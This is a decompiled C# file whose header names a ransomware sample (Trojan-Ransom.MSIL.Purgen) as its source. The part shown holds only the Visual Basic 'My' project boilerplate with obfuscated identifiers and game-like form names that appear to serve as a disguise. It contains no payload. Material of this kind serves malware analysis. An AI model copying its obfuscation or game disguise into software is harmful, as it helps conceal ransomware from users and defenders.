// Decompiled with JetBrains decompiler
// Type: uk希nTN席顾官Byf.Eg商生mv执执FoTRZ
// Assembly: p家s顾 公cI, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B63AEC7C-72D0-426E-ABEA-6AC0CAFDAC3B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Purgen.gen-07ea6a87a1ac2a5363e7756a8994f7ed8b971b94cef918803ab3b6dbe9e6b845.exe

using aj生顾y生首nbF;
using h希F泽Pj望IYP的SU;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using s首孙y顾顾r官氏f物;
using tf是kpvM的NnnFo;
using Tg城m顾Xq顾Y的席Z;
using ZM家太Wzr顾是h;
using 司j城MQ公族氏商是f;
using 太DL是yB氏uL的城执的;
using 氏的w城M是ZWoCZM;
using 泽太她希z顾NRi;
using 物YyW行mxvu望望家;
using 行U商I的fxgj;

namespace uk希nTN席顾官Byf
{
  [StandardModule]
  [HideModuleName]
  [GeneratedCode("MyTemplate", "11.0.0.0")]
  internal sealed class Eg商生mv执执FoTRZ
  {
    private static readonly Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<司UgI太NG司司是q物望> hT顾tOYqCdR = new Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<司UgI太NG司司是q物望>();
    private static readonly Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<望x首太k是A家V的m席> l生btCCKLT家C家h = new Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<望x首太k是A家V的m席>();
    private static readonly Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<User> C是EMvZ希u的 = new Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<User>();
    private static Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<Eg商生mv执执FoTRZ.MyForms> W行HG是家氏家O生氏 = new Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<Eg商生mv执执FoTRZ.MyForms>();
    private static readonly Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<Eg商生mv执执FoTRZ.MyWebServices> L望族J顾成成生BQ官o = new Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<Eg商生mv执执FoTRZ.MyWebServices>();

    [HelpKeyword("My.Computer")]
    internal static 司UgI太NG司司是q物望 Computer
    {
      [DebuggerHidden] get => Eg商生mv执执FoTRZ.hT顾tOYqCdR.GetInstance;
    }

    [HelpKeyword("My.Application")]
    internal static 望x首太k是A家V的m席 Application
    {
      [DebuggerHidden] get => Eg商生mv执执FoTRZ.l生btCCKLT家C家h.GetInstance;
    }

    [HelpKeyword("My.User")]
    internal static User User
    {
      [DebuggerHidden] get => Eg商生mv执执FoTRZ.C是EMvZ希u的.GetInstance;
    }

    [HelpKeyword("My.Forms")]
    internal static Eg商生mv执执FoTRZ.MyForms Forms
    {
      [DebuggerHidden] get => Eg商生mv执执FoTRZ.W行HG是家氏家O生氏.GetInstance;
    }

    [HelpKeyword("My.WebServices")]
    internal static Eg商生mv执执FoTRZ.MyWebServices WebServices
    {
      [DebuggerHidden] get => Eg商生mv执执FoTRZ.L望族J顾成成生BQ官o.GetInstance;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
    internal sealed class MyForms
    {
      [ThreadStatic]
      private static Hashtable m_FormBeingCreated;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public 顾M生kCP行kR m_EnterNameForm;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public Hnmmigh族d行族j司 m_Form1;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public g希的R司EDg公首eC m_Ignore;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public haZevhP商顾家 m_InformationForm;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public St是V顾p顾太e生w司物 m_LeaderBoardForm;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public 公PyUM生fh泽lDUQ m_MainMenu;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public m官sCq的hFD生w的望 m_MultiPlayer;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public 望w太rRvTCQIJ m_QuitForm;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public 的e成wc公的顾Ku m_SomeoneWon;
      [EditorBrowsable(EditorBrowsableState.Never)]
      public EUA望knGEq顾ZP官 m_StartUpForm;

      [DebuggerHidden]
      private static T Create__Instance__<T>(T Instance) where T : Form, new()
      {
        if ((object) Instance != null && !Instance.IsDisposed)
          return Instance;
        if (Eg商生mv执执FoTRZ.MyForms.m_FormBeingCreated != null)
        {
          if (Eg商生mv执执FoTRZ.MyForms.m_FormBeingCreated.ContainsKey((object) typeof (T)))
            throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
        }
        else
          Eg商生mv执执FoTRZ.MyForms.m_FormBeingCreated = new Hashtable();
        Eg商生mv执执FoTRZ.MyForms.m_FormBeingCreated.Add((object) typeof (T), (object) null);
        TargetInvocationException invocationException;
        try
        {
          return new T();
        }
        catch (TargetInvocationException ex) when (
        {
          // ISSUE: unable to correctly present filter
          ProjectData.SetProjectError((Exception) ex);
          invocationException = ex;
          if (invocationException.InnerException != null)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          throw new InvalidOperationException(Utils.GetResourceString("WinForms_SeeInnerException", invocationException.InnerException.Message), invocationException.InnerException);
        }
        finally
        {
          Eg商生mv执执FoTRZ.MyForms.m_FormBeingCreated.Remove((object) typeof (T));
        }
      }

      [DebuggerHidden]
      private void Dispose__Instance__<T>(ref T instance) where T : Form
      {
        instance.Dispose();
        instance = default (T);
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public MyForms()
      {
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object o) => base.Equals(RuntimeHelpers.GetObjectValue(o));

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode() => base.GetHashCode();

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal new System.Type GetType() => typeof (Eg商生mv执执FoTRZ.MyForms);

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString() => base.ToString();

      public 顾M生kCP行kR EnterNameForm
      {
        [DebuggerHidden] get
        {
          this.m_EnterNameForm = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<顾M生kCP行kR>(this.m_EnterNameForm);
          return this.m_EnterNameForm;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_EnterNameForm)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<顾M生kCP行kR>(ref this.m_EnterNameForm);
        }
      }

      public Hnmmigh族d行族j司 Form1
      {
        [DebuggerHidden] get
        {
          this.m_Form1 = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<Hnmmigh族d行族j司>(this.m_Form1);
          return this.m_Form1;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_Form1)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<Hnmmigh族d行族j司>(ref this.m_Form1);
        }
      }

      public g希的R司EDg公首eC Ignore
      {
        [DebuggerHidden] get
        {
          this.m_Ignore = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<g希的R司EDg公首eC>(this.m_Ignore);
          return this.m_Ignore;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_Ignore)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<g希的R司EDg公首eC>(ref this.m_Ignore);
        }
      }

      public haZevhP商顾家 InformationForm
      {
        [DebuggerHidden] get
        {
          this.m_InformationForm = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<haZevhP商顾家>(this.m_InformationForm);
          return this.m_InformationForm;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_InformationForm)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<haZevhP商顾家>(ref this.m_InformationForm);
        }
      }

      public St是V顾p顾太e生w司物 LeaderBoardForm
      {
        [DebuggerHidden] get
        {
          this.m_LeaderBoardForm = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<St是V顾p顾太e生w司物>(this.m_LeaderBoardForm);
          return this.m_LeaderBoardForm;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_LeaderBoardForm)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<St是V顾p顾太e生w司物>(ref this.m_LeaderBoardForm);
        }
      }

      public 公PyUM生fh泽lDUQ MainMenu
      {
        [DebuggerHidden] get
        {
          this.m_MainMenu = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<公PyUM生fh泽lDUQ>(this.m_MainMenu);
          return this.m_MainMenu;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_MainMenu)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<公PyUM生fh泽lDUQ>(ref this.m_MainMenu);
        }
      }

      public m官sCq的hFD生w的望 MultiPlayer
      {
        [DebuggerHidden] get
        {
          this.m_MultiPlayer = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<m官sCq的hFD生w的望>(this.m_MultiPlayer);
          return this.m_MultiPlayer;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_MultiPlayer)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<m官sCq的hFD生w的望>(ref this.m_MultiPlayer);
        }
      }

      public 望w太rRvTCQIJ QuitForm
      {
        [DebuggerHidden] get
        {
          this.m_QuitForm = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<望w太rRvTCQIJ>(this.m_QuitForm);
          return this.m_QuitForm;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_QuitForm)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<望w太rRvTCQIJ>(ref this.m_QuitForm);
        }
      }

      public 的e成wc公的顾Ku SomeoneWon
      {
        [DebuggerHidden] get
        {
          this.m_SomeoneWon = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<的e成wc公的顾Ku>(this.m_SomeoneWon);
          return this.m_SomeoneWon;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_SomeoneWon)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<的e成wc公的顾Ku>(ref this.m_SomeoneWon);
        }
      }

      public EUA望knGEq顾ZP官 StartUpForm
      {
        [DebuggerHidden] get
        {
          this.m_StartUpForm = Eg商生mv执执FoTRZ.MyForms.Create__Instance__<EUA望knGEq顾ZP官>(this.m_StartUpForm);
          return this.m_StartUpForm;
        }
        [DebuggerHidden] set
        {
          if (value == this.m_StartUpForm)
            return;
          if (value != null)
            throw new ArgumentException("Property can only be set to Nothing");
          this.Dispose__Instance__<EUA望knGEq顾ZP官>(ref this.m_StartUpForm);
        }
      }
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
    internal sealed class MyWebServices
    {
      [DebuggerHidden]
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object o) => base.Equals(RuntimeHelpers.GetObjectValue(o));

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public override int GetHashCode() => base.GetHashCode();

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      internal new System.Type GetType() => typeof (Eg商生mv执执FoTRZ.MyWebServices);

      [DebuggerHidden]
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString() => base.ToString();

      [DebuggerHidden]
      private static T Create__Instance__<T>(T instance) where T : new() => (object) instance == null ? new T() : instance;

      [DebuggerHidden]
      private void Dispose__Instance__<T>(ref T instance) => instance = default (T);

      [DebuggerHidden]
      [EditorBrowsable(EditorBrowsableState.Never)]
      public MyWebServices()
      {
      }
    }

    [ComVisible(false)]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class ThreadSafeObjectProvider<T> where T : new()
    {
      internal T GetInstance
      {
        [DebuggerHidden] get
        {
          if ((object) Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<T>.m_ThreadStaticValue == null)
            Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<T>.m_ThreadStaticValue = new T();
          return Eg商生mv执执FoTRZ.ThreadSafeObjectProvider<T>.m_ThreadStaticValue;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      [DebuggerHidden]
      public ThreadSafeObjectProvider()
      {
      }
    }
  }
}
